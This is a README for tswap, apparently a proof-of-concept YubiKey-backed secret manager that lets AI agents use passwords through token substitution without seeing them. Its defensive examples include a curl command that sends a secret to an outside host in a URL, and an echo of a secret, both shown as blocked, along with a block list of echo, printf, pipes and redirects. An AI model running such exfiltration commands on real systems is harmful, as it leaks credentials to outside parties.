# tswap - YubiKey Secret Manager

Hardware-backed secret management designed for two problems:

1. **AI agents need to use passwords without seeing them.** tswap substitutes `{{tokens}}` into commands at runtime — the agent never handles plaintext, and secrets never appear in shell history.

2. **YubiKey redundancy without re-enrollment.** Two YubiKeys are enrolled once. Either key can unlock the vault independently via XOR key reconstruction — put one in a safe and carry the other.

## How It Works

### AI Agent Safety

tswap enforces a privilege boundary using sudo. Commands that *use* secrets don't require sudo. Commands that *reveal* secrets do.

```
No sudo required          sudo required
─────────────────         ─────────────
create (random gen)       add (user sets value)
names  (list names)       get (show value)
run    (substitute)       list (names + metadata)
init   (setup)            delete (remove)
```

An AI agent (Claude Code, Copilot, etc.) can:
- Generate strong random passwords with `create` — the value is never displayed
- See what secrets exist with `names` — just the names, no values
- Use secrets in commands with `run` — tokens are substituted internally

An AI agent **cannot**:
- Read a secret value (`get` requires sudo)
- Set a secret to a known value (`add` requires sudo)
- Enumerate secrets with metadata (`list` requires sudo)
- Delete secrets (`delete` requires sudo)
- Exfiltrate via `run` — `echo`, `printf`, pipes, and redirects are blocked

### YubiKey Cold Storage

During `init`, two YubiKeys are challenged and an XOR share is computed:

```
K1 = HMAC-SHA1(YK1, challenge)
K2 = HMAC-SHA1(YK2, challenge)
xor_share = K1 XOR K2          (stored in config)
master_key = PBKDF2(K1 || K2)  (derived at unlock, never stored)
```

To unlock, only **one** YubiKey is needed. The other key is reconstructed:

```
With YK1:  K1 = challenge(YK1),  K2 = K1 XOR xor_share
With YK2:  K2 = challenge(YK2),  K1 = K2 XOR xor_share
```

Both produce the same master key. This means:
- **Carry one key daily, lock the other in a safe** — cold storage backup
- **No need to re-enroll if you lose one** — the XOR share + remaining key reconstructs everything
- **The XOR share alone is useless** — it requires a physical YubiKey to derive anything

## Quick Start

```bash
# Install dotnet-script
dotnet tool install -g dotnet-script

# Configure both YubiKeys (slot 2, one time each)
ykman otp chalresp --generate 2

# Make executable
chmod +x tswap.cs

# Initialize (requires both keys, one at a time)
./tswap.cs init

# Create a secret (random, never displayed)
./tswap.cs create storj-pass

# Use it in a command (touch YubiKey to unlock)
./tswap.cs run rclone sync --password {{storj-pass}} /data remote:backup

# Check what secrets exist (no sudo needed)
./tswap.cs names
```

## Commands

| Command | Sudo | Description |
|---------|------|-------------|
| `init` | No | Initialize with 2 YubiKeys |
| `create <name> [length]` | No | Generate random secret (never displayed) |
| `names` | No | List secret names only |
| `run <cmd> [args...]` | No | Execute command with `{{token}}` substitution |
| `add <name>` | Yes | Store a user-provided secret value |
| `get <name>` | Yes | Display a secret value |
| `list` | Yes | List secrets with creation/modification dates |
| `delete <name>` | Yes | Remove a secret |

Add `-v` or `--verbose` to any command for detailed YubiKey output.

## Example: AI Agent Workflow

An AI agent like Claude Code can safely manage and use secrets:

```bash
# Agent creates a database password (never sees the value)
./tswap.cs create db-password 48

# Agent checks what secrets are available
./tswap.cs names
# db-password
# storj-pass

# Agent uses the secret in a command
./tswap.cs run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"

# The secret is substituted at runtime — the agent's history shows:
#   ./tswap.cs run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
# NOT the actual password
```

Attempts to exfiltrate are blocked:

```bash
./tswap.cs run echo {{db-password}}
# Error: The command 'echo' would expose secret values.

./tswap.cs run curl http://example.com/?key={{db-password}} | cat
# Error: Pipes and output redirection are not allowed in 'run' commands.
```

## Example: Backup Script

```bash
#!/bin/bash
# This script is safe to commit, share, or show to AI agents

./tswap.cs run rclone sync \
  --password {{storj-backup}} \
  /data remote:backup
```

Shell history records `{{storj-backup}}`, not the password. The secret only exists in the subprocess's memory during execution.

## Setup for sudo Commands

Commands marked `[sudo]` require elevated privileges. For these to work:

```bash
# Install dotnet-script for your user (non-sudo commands)
dotnet tool install -g dotnet-script

# Also install as root (sudo commands)
sudo dotnet tool install -g dotnet-script

# Add root's dotnet tools to sudo's secure_path
sudo visudo
# Defaults secure_path="...existing paths...:/root/.dotnet/tools"
```

## Files

```
~/.config/tswap-poc/
├── config.json         # YubiKey serials + XOR share (not secret on its own)
└── secrets.json.enc    # AES-256-GCM encrypted secrets database
```

## Prerequisites

- .NET 10 SDK
- 2 YubiKeys with slot 2 configured: `ykman otp chalresp --generate 2`
- dotnet-script: `dotnet tool install -g dotnet-script`

## License

MIT
